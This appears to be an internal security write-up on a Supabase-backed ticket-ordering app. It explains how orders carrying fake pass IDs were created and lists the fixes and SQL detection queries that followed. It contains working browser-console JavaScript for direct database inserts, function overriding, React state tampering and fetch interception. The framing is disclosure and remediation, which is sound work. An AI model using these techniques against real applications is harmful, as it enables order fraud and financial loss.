# 🔓 How Attackers Can Manipulate Orders - Attack Vectors

## Overview
This document explains **HOW** someone can create orders with fake/manipulated pass IDs like `"test-pass-1"`.

**⚠️ Note:** This explains the vulnerability. Security fixes have been added to prevent this.

---

## Attack Vector #1: Direct Database Access via Browser Console

### How It Works:

1. **Open Browser Console** (F12 → Console tab)
2. **Access Supabase Client** (already loaded on the page)
3. **Insert Order Directly** (bypassing all validation)

### Step-by-Step Attack:

```javascript
// Step 1: Access Supabase client from browser console
const { createClient } = supabase;
const supabase = window.__SUPABASE_CLIENT__; // Or access from React DevTools

// Step 2: Create order directly with fake pass ID
const fakeOrder = await supabase
  .from('orders')
  .insert({
    source: 'ambassador_manual',  // ⚠️ Using ambassador_manual
    ambassador_id: 'ambassador-uuid-here',  // Ambassador's own ID or another's
    user_name: 'Fake Customer',
    user_phone: '27123456',
    user_email: 'fake@example.com',
    city: 'Sousse',
    ville: 'Test Area',
    pass_type: 'VIP',
    quantity: 2,
    total_price: 100,
    payment_method: 'cod',
    status: 'PENDING_CASH',
    notes: JSON.stringify({
      all_passes: [{
        passId: "test-pass-1",  // ⚠️ FAKE PASS ID
        passName: "VIP",
        quantity: 2,
        price: 50
      }],
      total_order_price: 100,
      pass_count: 1
    })
  })
  .select()
  .single();

console.log('Order created:', fakeOrder);
```

### Why This Works (BEFORE Security Fixes):

- ✅ No server-side validation of `passId`
- ✅ No check if `passId` exists in database
- ✅ No check if `passId` belongs to event
- ✅ RLS policy allowed `ambassador_manual` orders (removed now)

### Result:
- Order is created successfully
- `passId: "test-pass-1"` stored in database
- Order appears in admin dashboard
- Order appears in ambassador dashboard

---

## Attack Vector #2: Manipulate Form Data Before Submission

### How It Works:

1. **Open Order Page** (`/pass-purchase` or `/cod-order`)
2. **Fill Form Normally** (select valid passes)
3. **Intercept Before Submit** (browser console or DevTools)
4. **Modify Pass Data** (change passId to fake value)
5. **Submit Modified Data**

### Step-by-Step Attack:

```javascript
// Step 1: Intercept the form submission
// Find the createOrder function call

// Step 2: Override or modify the passes array before submission
// This happens in PassPurchase.tsx getSelectedPassesArray()

// Method A: Hook into the function before it's called
const originalCreateOrder = window.createOrder;
window.createOrder = async function(data) {
  // Manipulate the passes array
  data.passes = [{
    passId: "test-pass-1",  // ⚠️ CHANGED FROM REAL ID
    passName: "VIP",
    quantity: 2,
    price: 50
  }];
  
  // Call original function with manipulated data
  return originalCreateOrder(data);
};

// Method B: Modify React state before submit
// In browser console, access React DevTools
// Find the component state
// Modify selectedPasses or passes array
```

### Why This Works (BEFORE Security Fixes):

- ✅ Client-side validation only checks if pass exists in `event.passes` array
- ✅ No verification against database
- ✅ No check that `passId` matches what's in database
- ✅ Form data can be modified before `createOrder()` is called

### Result:
- Order is created with manipulated `passId`
- Fake `passId: "test-pass-1"` stored in database
- Original pass validation is bypassed

---

## Attack Vector #3: Call createOrder Directly from Console

### How It Works:

1. **Import createOrder function** (or access it via React DevTools)
2. **Call it directly** with fake data
3. **Bypass all form validation**

### Step-by-Step Attack:

```javascript
// Step 1: Access the createOrder function
// It's imported in PassPurchase.tsx, so it's in the bundle

// Step 2: Import necessary types/constants
// These are also available in the bundle

// Step 3: Call createOrder with fake data
await createOrder({
  customerInfo: {
    full_name: "Test Client",
    email: "test@example.com",
    phone: "27123456",
    city: "Sousse",
    ville: "Test"
  },
  passes: [{
    passId: "test-pass-1",  // ⚠️ FAKE PASS ID
    passName: "VIP",
    quantity: 2,
    price: 50
  }],
  paymentMethod: "ambassador_cash",
  ambassadorId: "ambassador-uuid-here",  // Ambassador's ID
  eventId: "some-event-id"  // Optional, can be null
});

// OR if eventId is null/undefined, it skips validation:
await createOrder({
  customerInfo: { /* ... */ },
  passes: [{
    passId: "test-pass-1",  // ⚠️ No validation if no eventId!
    passName: "VIP",
    quantity: 2,
    price: 50
  }],
  paymentMethod: "ambassador_cash",
  ambassadorId: "ambassador-uuid",
  eventId: null  // ⚠️ NO VALIDATION HAPPENS
});
```

### Why This Works (BEFORE Security Fixes):

- ✅ `createOrder()` has no server-side validation
- ✅ Accepts any `passId` without checking database
- ✅ If `eventId` is null, no validation happens
- ✅ Function is accessible in browser console

### Result:
- Order created with fake `passId: "test-pass-1"`
- No database verification
- Order stored successfully

---

## Attack Vector #4: Direct Supabase Client Call (Before RLS Fix)

### How It Works:

1. **RLS Policy Allowed** `ambassador_manual` orders (before fix)
2. **Ambassador Session** is checked via localStorage
3. **Insert Order Directly** using Supabase client

### Step-by-Step Attack:

```javascript
// Step 1: Ensure ambassador is logged in
// Check localStorage for 'ambassadorSession'
// Or log in as ambassador first

// Step 2: Get Supabase client (already initialized on page)
const { supabase } = await import('@/integrations/supabase/client');

// Step 3: Insert order directly
const { data, error } = await supabase
  .from('orders')
  .insert({
    source: 'ambassador_manual',  // ⚠️ Required by RLS policy
    ambassador_id: 'ambassador-id-from-session',  // Must match logged-in ambassador
    user_name: 'Fake Customer',
    user_phone: '27123456',
    user_email: 'fake@example.com',
    city: 'Sousse',
    ville: 'Test',
    pass_type: 'VIP',
    quantity: 2,
    total_price: 100,
    payment_method: 'cod',
    status: 'PENDING_CASH',
    notes: JSON.stringify({
      all_passes: [{
        passId: "test-pass-1",  // ⚠️ FAKE - Not validated
        passName: "VIP",
        quantity: 2,
        price: 50
      }]
    })
  })
  .select()
  .single();
```

### Why This Works (BEFORE Security Fixes):

- ✅ RLS policy allowed INSERT with `source: 'ambassador_manual'`
- ✅ RLS policy didn't verify `ambassador_id` matched logged-in user
- ✅ No validation of `passId` in notes
- ✅ Direct database insert bypassed all application logic

### Result:
- Order inserted directly into database
- `passId: "test-pass-1"` stored in notes
- Order appears in system

---

## Attack Vector #5: Modify PassPurchase Component State

### How It Works:

1. **Open PassPurchase Page** (`/pass-purchase`)
2. **Open React DevTools** (Browser extension)
3. **Find Component State**
4. **Modify selectedPasses** object
5. **Submit Form**

### Step-by-Step Attack:

```javascript
// Step 1: Open React DevTools
// Install React DevTools extension
// Find PassPurchase component

// Step 2: Access component state
const component = findReactComponent('PassPurchase');
const state = component.state || component.props;

// Step 3: Modify selectedPasses
component.setState({
  selectedPasses: {
    'test-pass-1': 2  // ⚠️ Fake pass ID instead of real one
  }
});

// OR modify event.passes array to include fake pass
component.setState({
  event: {
    ...component.state.event,
    passes: [
      ...component.state.event.passes,
      {
        id: 'test-pass-1',  // ⚠️ Add fake pass
        name: 'VIP',
        price: 50
      }
    ]
  }
});

// Step 4: Submit form normally
// The form will use the manipulated state
```

### Why This Works (BEFORE Security Fixes):

- ✅ React state can be modified via DevTools
- ✅ Form validation uses state values
- ✅ No verification against database
- ✅ Modified state is used in `getSelectedPassesArray()`

### Result:
- Fake `passId` is included in order
- Order is created successfully
- Validation is bypassed

---

## Attack Vector #6: Network Request Interception

### How It Works:

1. **Open Browser DevTools** → Network tab
2. **Fill Order Form** normally
3. **Intercept Network Request** before it's sent
4. **Modify Request Body** (change passId)
5. **Send Modified Request**

### Step-by-Step Attack:

```javascript
// Step 1: Set up request interceptor
const originalFetch = window.fetch;
window.fetch = async function(url, options) {
  // Intercept requests to Supabase
  if (url.includes('rest/v1/orders') && options?.method === 'POST') {
    // Parse request body
    const body = JSON.parse(options.body);
    
    // Modify notes to include fake passId
    const notes = JSON.parse(body.notes || '{}');
    notes.all_passes = [{
      passId: "test-pass-1",  // ⚠️ CHANGE TO FAKE ID
      passName: "VIP",
      quantity: 2,
      price: 50
    }];
    body.notes = JSON.stringify(notes);
    
    // Update request body
    options.body = JSON.stringify(body);
  }
  
  // Continue with original fetch
  return originalFetch(url, options);
};

// Step 2: Submit form normally
// The interceptor will modify the request
```

### Why This Works (BEFORE Security Fixes):

- ✅ Network requests can be intercepted
- ✅ Request body can be modified
- ✅ No server-side validation
- ✅ Supabase accepts modified data

### Result:
- Order created with modified `passId`
- Fake `passId: "test-pass-1"` stored
- Validation bypassed

---

## Why These Attacks Worked (BEFORE Security Fixes)

### Missing Security Layers:

1. ❌ **No Server-Side Validation:**
   - `createOrder()` didn't check if `passId` exists in database
   - No verification that `passId` belongs to event
   - No validation of pass price/name against database

2. ❌ **Client-Side Only Validation:**
   - Form validation only checked `event.passes` array
   - Array could be manipulated
   - No database verification

3. ❌ **Vulnerable RLS Policy:**
   - Policy allowed `ambassador_manual` orders
   - Didn't verify logged-in ambassador matched `ambassador_id`
   - Allowed direct database inserts

4. ❌ **Direct Database Access:**
   - Supabase client exposed in browser
   - Could be accessed via console
   - RLS was the only protection (and it was vulnerable)

5. ❌ **No Pass ID Validation:**
   - Any string could be used as `passId`
   - No UUID format validation
   - No check for test/fake IDs

---

## What the Attackers Could Do:

### ✅ Create Orders with:
- Fake pass IDs like `"test-pass-1"`
- Manipulated prices
- Fake pass names
- Any ambassador ID (even other ambassadors)

### ✅ Bypass:
- Form validation
- Client-side checks
- Application logic
- Order creation restrictions

### ✅ Result:
- Fake orders in database
- Orders with invalid pass IDs
- Data integrity compromised
- Potential fraud/financial loss

---

## Current Status (After Security Fixes)

### ✅ These Attacks Are Now Blocked:

1. ✅ **Server-Side Validation Added:**
   - Passes are validated against database
   - Pass IDs must exist and belong to event
   - Prices must match database

2. ✅ **Test/Fake IDs Rejected:**
   - IDs containing "test", "fake", "dummy" are blocked
   - UUID format validation
   - Must be valid database pass IDs

3. ✅ **RLS Policy Removed:**
   - Ambassadors can no longer insert orders directly
   - No `ambassador_manual` order creation allowed

4. ✅ **Route Protection Added:**
   - Ambassadors blocked from order pages
   - Cannot access `/pass-purchase` or `/cod-order`

5. ✅ **Function Disabled:**
   - `createCODOrder()` throws error if called
   - Cannot be used to create orders

---

## How to Verify Orders Were Created Illegitimately

### Check for:
1. **Test Pass IDs:** Orders with `passId: "test-pass-1"` or similar
2. **Invalid Pass IDs:** Pass IDs that don't exist in `event_passes` table
3. **Price Mismatches:** Orders with prices that don't match database
4. **Ambassador Manual Orders:** Orders with `source: 'ambassador_manual'` created by ambassadors
5. **Suspicious Timestamps:** Orders created in rapid succession
6. **Pattern Analysis:** Same ambassador creating multiple test orders

### SQL Query to Find Suspicious Orders:

```sql
-- Find orders with test/fake pass IDs
SELECT 
  id,
  ambassador_id,
  user_name,
  user_phone,
  notes,
  created_at,
  source
FROM orders
WHERE notes::text LIKE '%test-pass%'
   OR notes::text LIKE '%test_pass%'
   OR notes::text LIKE '%"test"%'
   OR notes::text LIKE '%"fake"%'
ORDER BY created_at DESC;

-- Find ambassador_manual orders
SELECT 
  id,
  ambassador_id,
  user_name,
  source,
  created_at
FROM orders
WHERE source = 'ambassador_manual'
ORDER BY created_at DESC;
```

---

**Note:** The order with `passId: "test-pass-1"` was likely created using one of these attack vectors before the security fixes were applied.
